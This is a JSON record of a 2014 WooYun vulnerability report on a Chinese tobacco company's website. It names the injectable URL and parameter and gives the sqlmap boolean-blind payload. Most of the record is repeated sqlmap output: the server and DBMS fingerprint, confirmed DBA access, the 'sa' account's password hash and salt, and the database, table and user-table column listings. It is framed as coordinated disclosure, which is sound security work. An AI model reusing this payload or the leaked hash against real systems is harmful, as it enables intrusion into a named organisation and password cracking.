{"id": 43441, "wybug_id": "wooyun-2014-082703", "wybug_title": "四川烟草工业SQL注射漏洞", "wybug_corp": "四川烟草", "wybug_author": "路人甲", "wybug_date": "2014-11-11 12:48", "wybug_open_date": "2014-12-26 12:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-26：\t细节向公众公开  简要描述： 四川烟草工业SQL注射漏洞 详细说明：  1.注射点\nhttp://www.scti.cn/Cpzs.aspx?id=62 (GET)\n2.注射信息\nsqlmap identified the following injection points with a total of 568 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: Generic boolean-based blind - Parameter replace (original value)    Payload: id=(SELECT (CASE WHEN (5434=5434) THEN 62 ELSE 1/(SELECT 0) END))---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: Generic boolean-based blind - Parameter replace (original value)    Payload: id=(SELECT (CASE WHEN (5434=5434) THEN 62 ELSE 1/(SELECT 0) END))---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000current user is DBA:    Truedatabase management system users password hashes:[*] sa [1]:    password hash: 0x0100e91f3a04fdf44e6586452bfb91e24c7819156597b34a5bea80ef1526af4f7a2a5274a0d6581c3f0495fa8be7        header: 0x0100        salt: e91f3a04        mixedcase: fdf44e6586452bfb91e24c7819156597b34a5bea        uppercase: 80ef1526af4f7a2a5274a0d6581c3f0495fa8be7available databases [11]:[*] master[*] model[*] msdb[*] Northwind[*] ProductionManage[*] ProductionPlanManage[*] pubs[*] scgy_cd[*] scgyWW[*] tempdb[*] WebSite2014sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: Generic boolean-based blind - Parameter replace (original value)    Payload: id=(SELECT (CASE WHEN (5434=5434) THEN 62 ELSE 1/(SELECT 0) END))---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: Generic boolean-based blind - Parameter replace (original value)    Payload: id=(SELECT (CASE WHEN (5434=5434) THEN 62 ELSE 1/(SELECT 0) END))---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000current database:    'WebSite2014'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: Generic boolean-based blind - Parameter replace (original value)    Payload: id=(SELECT (CASE WHEN (5434=5434) THEN 62 ELSE 1/(SELECT 0) END))---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000Database: WebSite2014[39 tables]+----------------------------+| dtproperties               || sysconstraints             || syssegments                || v_dm_location              || v_getdate                  || v_xt_dept                  || v_xt_organise              || v_xt_t_user                || ww_attached_property_group || ww_attached_property_set   || ww_attached_property_value || ww_base_info               || ww_content                 || ww_content_adjunct         || ww_friend_website          || ww_invite_adjunct          || ww_invite_content          || ww_mod                     || ww_query_authority         || ww_visits_info             || xt_t_data_dict             || xt_t_error_log             || xt_t_function_mod          || xt_t_log                   || xt_t_log_info              || xt_t_log_set               || xt_t_mod_access            || xt_t_mod_access_detail     || xt_t_modulehelp            || xt_t_organise              || xt_t_param_enum_type_value || xt_t_parameter             || xt_t_parameter_disp_rows   || xt_t_parameter_type        || xt_t_role                  || xt_t_role_popedom          || xt_t_shortcut_function     || xt_t_user                  || xt_t_user_role             |+----------------------------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: Generic boolean-based blind - Parameter replace (original value)    Payload: id=(SELECT (CASE WHEN (5434=5434) THEN 62 ELSE 1/(SELECT 0) END))---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000Database: WebSite2014Table: xt_t_user[11 columns]+---------------+----------+| Column        | Type     |+---------------+----------+| keyid         | numeric  || note_date     | datetime || person_id     | numeric  || remark        | varchar  || sort_id       | int      || unitid        | varchar  || use_flag      | char     || user_account  | varchar  || user_name     | varchar  || user_password | varchar  || userid        | varchar  |+---------------+----------+\n   漏洞证明：  \ndatabase management system users password hashes:[*] sa [1]:    password hash: 0x0100e91f3a04fdf44e6586452bfb91e24c7819156597b34a5bea80ef1526af4f7a2a5274a0d6581c3f0495fa8be7        header: 0x0100        salt: e91f3a04        mixedcase: fdf44e6586452bfb91e24c7819156597b34a5bea        uppercase: 80ef1526af4f7a2a5274a0d6581c3f0495fa8be7available databases [11]:[*] master[*] model[*] msdb[*] Northwind[*] ProductionManage[*] ProductionPlanManage[*] pubs[*] scgy_cd[*] scgyWW[*] tempdb[*] WebSite2014\n   修复方案：  修复注射点   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2014-11-14 17:36 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}